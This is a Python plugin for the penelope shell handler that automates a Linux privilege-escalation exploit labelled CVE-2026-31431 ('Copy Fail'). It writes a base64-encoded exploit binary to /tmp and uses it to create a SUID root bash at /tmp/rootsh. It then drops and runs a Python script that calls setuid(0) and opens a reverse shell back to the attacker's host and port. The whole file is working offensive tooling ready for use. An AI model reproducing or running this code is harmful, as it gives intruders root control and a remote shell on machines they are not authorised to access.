import penelope

# Required: must subclass penelope.Module
class copyfail(penelope.Module):

    # Module category shown in `run` listing
    category = "Privilege Escalation"

    # Set True to auto-run when a session is first established
    on_session_start = False

    # Set True to auto-run on first interactive attach
    on_first_attach = False

    # Set True to auto-run when session ends
    on_session_end = False

    def run(session, args=None):
        """
        Execute Copy Fail One-liner (CVE-2026-31431)
        """

        # Guard on OS if module is platform-specific
        if session.OS == 'Windows':
            penelope.logger.error("This module runs on Unix only")
            return

        host = session._host
        port = session._port

        import os as _os
        _here = _os.path.dirname(_os.path.abspath(__file__))
        COPYFAIL_B64 = open(_os.path.join(_here, "b64_binaries", "copyfail.b64")).read().strip()

        # Stage exploit — value=True blocks until write completes
        staged = session.exec(
            f"echo '{COPYFAIL_B64}' | base64 -d > /tmp/copyfail && chmod +x /tmp/copyfail && echo staged",
            value=True
        )
        if not staged or "staged" not in staged:
            penelope.logger.error("Failed to stage exploit binary")
            return

        # Pipe command into exploit stdin — patched su drops root shell reading from stdin
        # (penelope raw sessions have no /dev/tty so root shell falls back to pipe stdin)
        session.exec("echo 'cp /bin/bash /tmp/rootsh && chmod 4755 /tmp/rootsh' | /tmp/copyfail", value=False)

        # Poll for SUID shell instead of blocking sleep
        suid_check = None
        for _ in range(10):
            suid_check = session.exec("ls -la /tmp/rootsh 2>/dev/null", value=True)
            if suid_check and "rwsr" in suid_check:
                break
            import time; time.sleep(1)

        if not suid_check or "rwsr" not in suid_check:
            penelope.logger.error("SUID shell not created — exploit failed")
            return

        print("[+] SUID shell created — writing root callback")
        # rootsh -p = EUID=0, RUID=marco; python3 setuid(0) collapses to true root
        # use python3 socket directly — no /dev/tcp bash dependency
        import base64 as _b64
        cb = (
            f"import os,socket,subprocess\n"
            f"os.setuid(0);os.setgid(0)\n"
            f"s=socket.socket()\n"
            f"s.connect(('{host}',{port}))\n"
            f"[os.dup2(s.fileno(),f) for f in(0,1,2)]\n"
            f"subprocess.call(['/bin/bash','-i'])\n"
        )
        b64 = _b64.b64encode(cb.encode()).decode()
        session.exec(f"echo '{b64}' | base64 -d > /tmp/rootcb.py; chmod +x /tmp/rootcb.py", value=True)
        session.exec("/tmp/rootsh --norc --noprofile -p -c 'python3 /tmp/rootcb.py' &", value=False)